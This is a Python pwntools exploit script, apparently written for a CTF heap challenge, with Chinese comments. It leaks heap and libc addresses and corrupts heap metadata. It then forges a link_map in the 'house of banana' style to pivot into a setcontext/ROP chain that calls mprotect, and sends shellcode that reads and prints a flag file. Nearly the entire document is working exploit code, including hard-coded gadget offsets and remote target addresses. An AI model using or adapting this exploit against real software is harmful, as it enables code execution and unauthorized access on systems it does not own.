# -*- coding: utf-8 -*-
from pwn import *
from libformatstr import FormatStr
# context.log_level = 'debug'
# context.terminal=['tmux','splitw','-h']
context(arch='amd64', os='linux')
# context(arch='i386', os='linux')
local = 1
elf = ELF('./pwn1')
if local:
    p = process('./pwn1')
    libc = elf.libc
else:
    p = remote('116.85.48.105',5005)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')


sl = lambda s : p.sendline(s)
sd = lambda s : p.send(s)
rc = lambda n : p.recv(n)
ru = lambda s : p.recvuntil(s)
ti = lambda : p.interactive()
def ms(name,addr):
    print name + "---->" + hex(addr)

def debug(mallocr,PIE=True):
    if PIE:
        text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
        gdb.attach(p,'b *{}'.format(hex(text_base+mallocr)))
    else:
        gdb.attach(p,"b *{}".format(hex(mallocr)))



def add(size,content):
    ru("choice:")
    sl('1')
    ru("Size of info:")
    sl(str(size))
    ru("Info:")
    sd(content)
def edit(index,content):
    ru("choice:")
    sl('2')
    ru("index:")
    sl(str(index))
    ru("2.show")
    ru("choice:")
    sl('1')
    ru("Info:")
    sd(content)
def show(index):
    ru("choice:")
    sl('2')
    ru("index:")
    sl(str(index))
    ru("choice:")
    sl('2')
def exit():
	ru("choice:")
	sl('3')

def pwn(value):
	for i in range(11) :
		add(0xf0,'aaaa')
	for i in range(7):
		show(i)
	show(7)
	add(0xf0,'a')#0
	show(0)
	ru("Info:")
	heap = u64(rc(6).ljust(8,'\x00'))-0x761
	print "libc_base--->"+hex(heap)
	for i in range(7):
		add(0xf0,'bbbb')#0-6
	add(0x80,'a')#7
	show(7)
	ru("Info:")
	libc_base = u64(rc(6).ljust(8,'\x00'))-0x1ebc61
	print "libc_base--->"+hex(libc_base)

	malloc_hook = libc_base + libc.sym["__malloc_hook"]
	fake_chunk = malloc_hook - 0x23
	onegadget = libc_base + one64[2]
	realloc = libc_base + libc.sym["realloc"]
	free_hook = libc_base + libc.sym["__free_hook"]
	system = libc_base + libc.sym["system"]
	binsh = libc_base + libc.search("/bin/sh").next()
	setcontext = libc_base + libc.sym["setcontext"]
	ld = libc_base + 0x100000 + (value<<12)
	mprotect = libc_base + libc.sym["mprotect"]
	pop_rdx_r12_ret = libc_base+0x000000000011c1e1
	ret = libc_base + 0x00000000000c1479
	pop_rdi_ret = libc_base + 0x0000000000026b72
	pop_rsi_ret = libc_base + 0x0000000000027529
	pop_rax_ret = libc_base + 0x000000000004a550
	jmp_rax = libc_base + 0x0000000000026e91
	read = libc_base + libc.sym["read"]
	set_context = libc_base + libc.sym["setcontext"]
	rtld_global = ld + 0x2e060

	add(0x60,'kkk')#7

	# debug(0)
	for i in range(5):
		add(0xf0,'aaaa')
	show(0)
	ptr = heap+0x8a0
	py = ''
	py += p64(0)+p64(0x1f1)
	py += p64(ptr)+p64(ptr)
	add(0xf0,py)
	py = ''
	py += 'a'*0x60
	py += p64(0x1f0)[:7]
	edit(7,py)
	show(4)
	show(5)
	show(9)
	show(10)
	show(11)
	show(12)
	show(13)
	show(8)
	add(0x80,'xxxx')
	add(0x80,'zzzz')
	show(5)
	show(4)
	py = 'a'*0x50
	py += p64(0)+p64(0x91)
	py += p64(rtld_global)
	add(0x1f0,py)
	add(0x80,'xxxx')
	heap_addr = heap+0x1290
	add(0x80,p64(heap_addr)+p8(4))

	def house_of_banana(heap_addr,rip,rsp,rdi,rsi,rdx):
		py = ''
		py += p64(0) + p64(ld+0x2f740)#这是l->next指针,确保循环正常进行即可，这里链的长度至少要大于等于4，如果真实地址的这个链不满足条件，就用堆自己伪造这个链，一样的。
		py += p64(0) + p64(heap_addr)#这是l->real指针，需要使得l==l->real，才能进入到循环，同时也是rdx的值
		py += p64(set_context+61) + p64(ret)
		#rsp_start  stack py
		py += p64(pop_rdi_ret)
		py += p64(0)
		py += p64(pop_rsi_ret)
		py += p64(free_hook)
		py += p64(pop_rdx_r12_ret)
		py += p64(0x100)
		py += p64(0)
		py += p64(read)
		py += p64(pop_rax_ret)
		py += p64(free_hook)
		py += p64(jmp_rax)
		py += p64(0)
		py += p64(rdi)#rdi 0x68
		py += p64(rsi)#rsi 0x70
		py += p64(0)*2
		py += p64(rdx)#rdx 0x88
		py += p64(0)
		py += p64(0)#rcx 0x98
		py += p64(rsp)#rsp #0xa0
		py += p64(rip) #rip 0xa8
		py = py.ljust(0x100,'\x00')
		py += p64(heap_addr + 0x120)#0x110，跳板地址
		py += p64(heap_addr + 0x120)#0x118
		py += p64(heap_addr + 0x120)#0x120，l_info[DT_FINI_ARRAY]的节描述符地址(算上堆头)
		py += p64(0x10)#l_info[DT_FINI_ARRAY]的节描述符地址+8处的fini_array的地址偏移值，0x10同时表示有2个析构函数
		py = py.ljust(0x30C,'\x00')
		py += p8(0x8)#绕过if(l->l_init_called)的check，保证进入if条件
		return py

	payload = house_of_banana(heap_addr,mprotect,(heap_addr + 0x40),(free_hook & 0xfffffffffffff000),0x1000,0x7)

	add(0x200,payload[:0x200])
	add(0x200,payload[0x210:])
	show(15)
	for i in range(7):
		add(0xf8,'g')
	py = ''
	py += 'l'*0xf0
	py += p64(heap_addr+0x20)[:7]
	add(0xf8,py)
	# debug(0x0000000000018E3)
	exit()
	shellcode644 = asm('''
	mov r8, 0x67616c662f2e
	push r8
	mov rdi, rsp
	mov rsi, 0
	mov eax, 2
	syscall 

	mov rdi, rax
	mov rsi, rsp
	mov rdx, 0x100
	mov eax, 0
	syscall

	mov rdi, 1
	mov rsi, rsp
	mov rdx, 0x100
	mov eax, 1
	syscall 
	    ''')
	# pause()
	sl(shellcode644)

value = 0xf0
# pwn(value)
i = 0
while 1:
    print i
    i += 1
    try:
        print("value--->"+hex(value))
        pwn(value)
    except EOFError:
        p.close()
        local = 1
        elf = ELF('./pwn1')
        if local:
            p = process('./pwn1')
            libc = elf.libc
            value += 1
            continue
        else:
            p = remote('121.40.246.48',9999)
            libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
            value += 1
    else:
        sl("ls")
        break

p.interactive()